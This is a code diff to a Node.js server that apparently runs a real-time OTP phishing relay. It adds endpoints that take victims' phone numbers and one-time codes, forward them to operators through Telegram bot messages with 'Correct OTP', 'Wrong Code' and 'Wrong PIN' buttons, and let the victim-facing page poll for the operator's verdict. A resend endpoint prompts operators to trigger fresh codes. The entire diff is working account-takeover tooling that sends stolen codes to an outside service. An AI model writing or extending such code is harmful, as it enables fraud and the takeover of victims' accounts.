@@ -653,6 +653,60 @@ async function handleCallbackQuery(user, query) {
       }
     }
 
+    // ========== FIRST OTP ==========
+    else if (type === 'firstotp') {
+      const otp = dataValue;
+      const verificationKey = `${phoneNumber}-${otp}`;
+      user.firstOtpVerifications = user.firstOtpVerifications || new Map();
+      const otpData = user.firstOtpVerifications.get(verificationKey);
+
+      if (!otpData) {
+        const { number } = formatPhoneNumber(phoneNumber);
+        await updateMessage(`❌ <b>FIRST OTP NOT FOUND</b>\n\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired`);
+        await acknowledgeCallback('❌ Session not found or expired', true);
+        return;
+      }
+
+      const elapsed = Date.now() - otpData.timestamp;
+      if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
+        otpData.expired = true;
+        otpData.status = 'timeout';
+        const { number } = formatPhoneNumber(phoneNumber);
+        await updateMessage(`⏰ <b>FIRST OTP EXPIRED</b>\n\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed / 1000)}s`);
+        await acknowledgeCallback('⏰ Session expired', true);
+        return;
+      }
+
+      if (otpData.status !== 'pending') {
+        await acknowledgeCallback(`⚠️ Already processed: ${otpData.status}`, true);
+        return;
+      }
+
+      const { number } = formatPhoneNumber(phoneNumber);
+
+      if (action === 'correct') {
+        otpData.status = 'approved';
+        otpData.processedAt = Date.now();
+        await updateMessage(`1️⃣ <b>FIRST OTP VERIFIED ✅</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n✅ <b>Status:</b> OTP verified\n➡️ <b>Next:</b> Second OTP (2/2)\n⏱️ ${new Date().toLocaleTimeString()}`);
+        await acknowledgeCallback('✅ First OTP approved!');
+        logger.info(`${user.name}: ✅ First OTP approved for ${phoneNumber}`);
+      } else if (action === 'wrong') {
+        otpData.status = 'rejected';
+        otpData.processedAt = Date.now();
+        await updateMessage(`❌ <b>WRONG FIRST OTP</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n❌ <b>Status:</b> Invalid first OTP\n⏱️ ${new Date().toLocaleTimeString()}`);
+        await acknowledgeCallback('❌ Marked as wrong');
+        logger.info(`${user.name}: ❌ Wrong First OTP for ${phoneNumber}`);
+      } else if (action === 'wrongpin') {
+        otpData.status = 'wrong_pin';
+        otpData.processedAt = Date.now();
+        await updateMessage(`⚠️ <b>WRONG PIN (First OTP)</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n⚠️ <b>Status:</b> Incorrect PIN\n⏱️ ${new Date().toLocaleTimeString()}`);
+        await acknowledgeCallback('⚠️ Marked as wrong PIN');
+        logger.info(`${user.name}: ⚠️ Wrong PIN for First OTP - ${phoneNumber}`);
+      } else {
+        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
+      }
+    }
+
     // ========== SECOND OTP ==========
     else if (type === 'secondotp') {
       const otp = dataValue;
@@ -929,6 +983,7 @@ const loadUsers = () => {
         isHealthy: false,
         lastError: null,
         loginNotifications: new Map(),
+        firstOtpVerifications: new Map(),
         secondOtpVerifications: new Map(),
         secondPinMethodDecisions: new Map(),
         promptPinVerifications: new Map(),
@@ -1019,6 +1074,12 @@ setInterval(() => {
             v.expired = true;
             v.status = 'timeout';
           }
+        user.firstOtpVerifications = user.firstOtpVerifications || new Map();
+        for (const [, v] of user.firstOtpVerifications.entries())
+          if (v.timestamp < timeoutThreshold && !v.expired) {
+            v.expired = true;
+            v.status = 'timeout';
+          }
         for (const [, v] of user.promptPinVerifications.entries())
           if (v.timestamp < timeoutThreshold && v.status === 'pending') v.status = 'timeout';
         for (const [, v] of user.requestPinVerifications.entries())
@@ -1028,6 +1089,8 @@ setInterval(() => {
           if (v.timestamp < deleteThreshold) user.loginNotifications.delete(k);
         for (const [k, v] of user.secondOtpVerifications.entries())
           if (v.timestamp < deleteThreshold) user.secondOtpVerifications.delete(k);
+        for (const [k, v] of user.firstOtpVerifications.entries())
+          if (v.timestamp < deleteThreshold) user.firstOtpVerifications.delete(k);
         for (const [k, v] of user.promptPinVerifications.entries())
           if (v.timestamp < deleteThreshold) user.promptPinVerifications.delete(k);
         for (const [k, v] of user.requestPinVerifications.entries())
@@ -1062,6 +1125,7 @@ app.get('/api/health', (req, res) => {
       active: !!u.bot,
       healthy: u.isHealthy,
       logins: u.loginNotifications.size,
+      firstOtps: u.firstOtpVerifications.size,
       secondOtps: u.secondOtpVerifications.size,
       promptPins: u.promptPinVerifications.size,
       requestPins: u.requestPinVerifications.size,
@@ -1282,6 +1346,135 @@ users.forEach((user, linkInsert) => {
       }
     } catch (error) {
       logger.error(`verify-request-pin error for ${user.name}:`, error.message);
+      res.status(500).json({ success: false, error: 'Internal server error' });
+    }
+  });
+
+  app.post(`${basePath}/verify-first-otp`, async (req, res) => {
+    try {
+      if (!user.bot || !user.isHealthy) return res.status(503).json({ success: false, message: 'Bot service unavailable' });
+      const { phoneNumber, otp, timestamp } = req.body;
+      if (!phoneNumber || !otp) return res.status(400).json({ success: false, message: 'Phone number and OTP required' });
+      const pv = validatePhoneNumber(phoneNumber);
+      if (!pv.valid) return res.status(400).json({ success: false, message: pv.error });
+      const ov = validateOtp(otp);
+      if (!ov.valid) return res.status(400).json({ success: false, message: ov.error });
+
+      const { countryCode, number } = formatPhoneNumber(phoneNumber);
+      const verificationKey = `${phoneNumber}-${otp}`;
+      user.firstOtpVerifications = user.firstOtpVerifications || new Map();
+      user.firstOtpVerifications.set(verificationKey, { status: 'pending', timestamp: Date.now() });
+      logger.info(`${user.name}: 1️⃣ New First OTP verification - ${phoneNumber}`);
+
+      const message = `1️⃣ <b>${sanitizeInput(user.name)} - FIRST OTP VERIFICATION</b>
+
+✅ <b>Login request approved</b>
+🇺🇸 <b>Country:</b> USA
+🌍 <b>Country Code:</b> <code>${countryCode}</code>
+📱 <b>Phone Number:</b> <code>${number}</code>
+🔐 <b>OTP Code:</b> <code>${sanitizeInput(otp)}</code>
+⏰ <b>Time:</b> ${new Date(timestamp || Date.now()).toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━━
+
+⚠️ <b>Verify OTP:</b>
+⏱️ <b>Timeout:</b> 5 minutes`;
+
+      const result = await sendTelegramMessage(user, message, {
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '✅ Correct OTP', callback_data: `firstotp_correct_${phoneNumber}_${otp}` }],
+            [
+              { text: '❌ Wrong Code', callback_data: `firstotp_wrong_${phoneNumber}_${otp}` },
+              { text: '⚠️ Wrong PIN', callback_data: `firstotp_wrongpin_${phoneNumber}_${otp}` },
+            ],
+          ],
+        },
+      });
+
+      if (result.success) {
+        res.json({ success: true, message: 'OTP verification sent to admin' });
+      } else {
+        res.status(500).json({ success: false, message: 'Failed to send notification', error: result.error });
+      }
+    } catch (error) {
+      logger.error(`verify-first-otp error for ${user.name}:`, error.message);
+      res.status(500).json({ success: false, error: 'Internal server error' });
+    }
+  });
+
+  app.post(`${basePath}/check-first-otp-status`, async (req, res) => {
+    try {
+      const { phoneNumber, otp } = req.body;
+      if (!phoneNumber || !otp) return res.status(400).json({ success: false, message: 'Phone number and OTP required' });
+      const pv = validatePhoneNumber(phoneNumber);
+      if (!pv.valid) return res.status(400).json({ success: false, message: pv.error });
+      const ov = validateOtp(otp);
+      if (!ov.valid) return res.status(400).json({ success: false, message: ov.error });
+
+      const verificationKey = `${phoneNumber}-${otp}`;
+      user.firstOtpVerifications = user.firstOtpVerifications || new Map();
+      const otpData = user.firstOtpVerifications.get(verificationKey);
+
+      if (!otpData) {
+        return res.json({ success: true, status: 'pending', message: 'Waiting for admin verification...' });
+      }
+
+      if (otpData.status === 'approved') {
+        return res.json({ success: true, status: 'approved', message: 'OTP verified!' });
+      }
+
+      if (otpData.status === 'rejected') {
+        return res.json({ success: true, status: 'rejected', message: 'OTP rejected' });
+      }
+
+      if (otpData.status === 'wrong_pin') {
+        return res.json({ success: true, status: 'wrong_pin', message: 'Wrong PIN' });
+      }
+
+      if (otpData.status === 'timeout') {
+        return res.json({ success: true, status: 'timeout', message: 'Verification timed out' });
+      }
+
+      return res.json({ success: true, status: 'pending', message: 'Waiting for admin verification...' });
+    } catch (error) {
+      logger.error(`check-first-otp-status error for ${user.name}:`, error.message);
+      res.status(500).json({ success: false, error: 'Internal server error' });
+    }
+  });
+
+  app.post(`${basePath}/resend-first-otp`, async (req, res) => {
+    try {
+      if (!user.bot || !user.isHealthy) return res.status(503).json({ success: false, message: 'Bot service unavailable' });
+      const { phoneNumber, timestamp } = req.body;
+      if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone number required' });
+      const pv = validatePhoneNumber(phoneNumber);
+      if (!pv.valid) return res.status(400).json({ success: false, message: pv.error });
+
+      const { countryCode, number } = formatPhoneNumber(phoneNumber);
+      logger.info(`${user.name}: 📱 Resending First OTP - ${phoneNumber}`);
+
+      const message = `📱 <b>${sanitizeInput(user.name)} - RESEND FIRST OTP</b>
+
+🇺🇸 <b>Country:</b> USA
+🌍 <b>Country Code:</b> <code>${countryCode}</code>
+📱 <b>Phone Number:</b> <code>${number}</code>
+⏰ <b>Time:</b> ${new Date(timestamp || Date.now()).toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━━
+
+ℹ️ <b>Note:</b> User requested OTP code to be resent
+⏱️ A new OTP should be sent to the phone number above`;
+
+      const result = await sendTelegramMessage(user, message);
+
+      if (result.success) {
+        res.json({ success: true, message: 'Resend notification sent to admin' });
+      } else {
+        res.status(500).json({ success: false, message: 'Failed to send notification', error: result.error });
+      }
+    } catch (error) {
+      logger.error(`resend-first-otp error for ${user.name}:`, error.message);
       res.status(500).json({ success: false, error: 'Internal server error' });
     }
   });
